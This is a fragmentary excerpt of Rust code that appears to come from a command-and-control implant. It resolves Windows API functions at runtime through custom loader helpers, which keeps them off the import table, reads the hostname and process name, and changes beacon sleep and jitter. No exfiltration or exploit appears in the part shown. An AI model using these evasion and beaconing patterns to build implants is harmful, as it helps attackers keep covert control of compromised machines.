...
pub fn get_hostname() -> String {
    ...
    */
    ...
    // Get the address of the GetComputerNameExW function
    let proc = ldr_get_fn(module_name, "GetComputerNameExW");
    // If the function could not be found, return "Unknown"
    if proc.is_null() {
        return "Unknown".to_string();
    }
...
pub fn get_process_name() -> String {
    ...
    let module_name = ldr_get_dll("kernel32.dll");
    let proc = ldr_get_fn(module_name, "GetModuleFileNameW");
...
pub fn change_sleep(args: Vec<&str>, sleep: &mut String, jitter: &mut String) -> String {
    ...
    *jitter = new_jitter.clone();
    ...
    format!(
        "Sleep time set to {} seconds with jitter of {} percent",
        &sleep_time, &jitter
    )
}
